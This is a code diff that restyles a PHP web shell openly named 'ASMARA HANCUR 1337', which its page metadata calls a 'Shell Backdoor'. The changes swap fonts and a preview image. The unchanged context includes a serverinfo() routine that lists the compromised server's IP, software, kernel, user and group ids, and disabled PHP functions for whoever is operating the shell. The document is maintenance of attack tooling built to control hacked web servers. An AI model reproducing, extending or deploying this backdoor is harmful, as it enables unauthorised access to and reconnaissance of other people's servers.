@@ -3,15 +3,15 @@
 <head>
 <title>[+] ASMARA HANCUR 1337 [+]</title>
 <meta property="og:description" content="Asmara Hancur Shell Backdoor Meluncur !!!">
-<meta property="og:image" content="https://jawatengahxploit1337.github.io/foto/Love.jpg">
+<meta property="og:image" content="https://i.pinimg.com/originals/0d/88/e3/0d88e3179b26e5c323386a9035e4ef44.jpg">
 <meta name='author' content='./W4D3R 1337'>
 <meta charset="UTF-8">
 <style type='text/css'>
-@import url(https://fonts.googleapis.com/css?family=Abel);
-@import url(http://fonts.googleapis.com/css?family=Iceberg);
-html {background: #111111;color: #ffffff;font-family: 'Iceberg';font-size: 13px;width: 100%;}
+@import url(https://fonts.googleapis.com/css?family=Ubuntu);
+@import url(http://fonts.googleapis.com/css?family=Ubuntu);
+html {background: #111111;color: #ffffff;font-family: 'Ubuntu';font-size: 13px;width: 100%;}
 li {display: inline;margin: 5px;padding: 5px;}
-table, th, td {border-collapse:collapse;font-family: Tahoma, Geneva, sans-serif;background: transparent;font-family: 'Iceberg';font-size: 13px;}
+table, th, td {border-collapse:collapse;font-family: Tahoma, Geneva, sans-serif;background: transparent;font-family: 'Ubuntu';font-size: 13px;}
 .table_home, .th_home, .td_home {border: 1px solid #ffffff;}
 .table_home tr:hover {background-color: green;}
 .th_home tr:hover{background-color: #1a1a1a;}
@@ -22,10 +22,10 @@ a:hover {color: gold;text-decoration: underline;text-shadow: 0pt 0pt 0.9em lime,
 #tangina:hover{ background-color: #1a1a1a; }
 b {color: gold;}
 input[type=text], input[type=password],input[type=submit] {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;
-    font-family: 'Abel';font-size: 13px;}
-textarea {border: 1px solid #ffffff;width: 100%;height: 400px;padding-left: 5px;margin: 10px auto;resize: none;background: transparent;color: #ffffff;font-family: 'Abel';font-size: 13px;}
-select {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Abel';font-size: 13px;}
-.but {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Abel';font-size: 13px;}
+    font-family: 'Ubuntu';font-size: 13px;}
+textarea {border: 1px solid #ffffff;width: 100%;height: 400px;padding-left: 5px;margin: 10px auto;resize: none;background: transparent;color: #ffffff;font-family: 'Ubuntu';font-size: 13px;}
+select {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Ubuntu';font-size: 13px;}
+.but {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Ubuntu';font-size: 13px;}
 li a:hover{text-shadow: 0pt 0pt 0.99em lime, 0pt 0pt 0.99em lime;color: #00ff00;text-decoration: none;}
 .th_home, .titulo {text-shadow: 0pt 0pt 0.99em lime, 0pt 0pt 0.99em lime;color: #00ff00;text-decoration: none;}
 .board {text-align: center;border: 1px solid rgba(255,180,0,0.4);border-radius: 4px;width: 500px;}
@@ -395,7 +395,7 @@ function serverinfo() {
 	$disable_functions = @ini_get('disable_functions');
 	$disable_functions = (!empty($disable_functions)) ? color(1, 1, $disable_functions) : color(1, 2, "NONE");
 
-	$output[] = "<font face=Iceberg><color=green ><i>SERVER IP <gr>".gethostbyname($_SERVER['HTTP_HOST'])."</gr> / YOUR IP ".color(1, 2, $_SERVER['REMOTE_ADDR']);
+	$output[] = "<font face=Ubuntu><color=green ><i>SERVER IP <gr>".gethostbyname($_SERVER['HTTP_HOST'])."</gr> / YOUR IP ".color(1, 2, $_SERVER['REMOTE_ADDR']);
 	$output[] = "WEB SERVER  : ".color(1, 2, $_SERVER['SERVER_SOFTWARE']);
 	$output[] = "SYSTEM      : ".color(1, 2, php_uname());
 	$output[] = "USER / GROUP: ".color(1, 2, usergroup()->name)."(".color(1, 2 , usergroup()->uid).") / ".color(1, 2 , usergroup()->group)."(".color(1, 2 , usergroup()->gid).")";
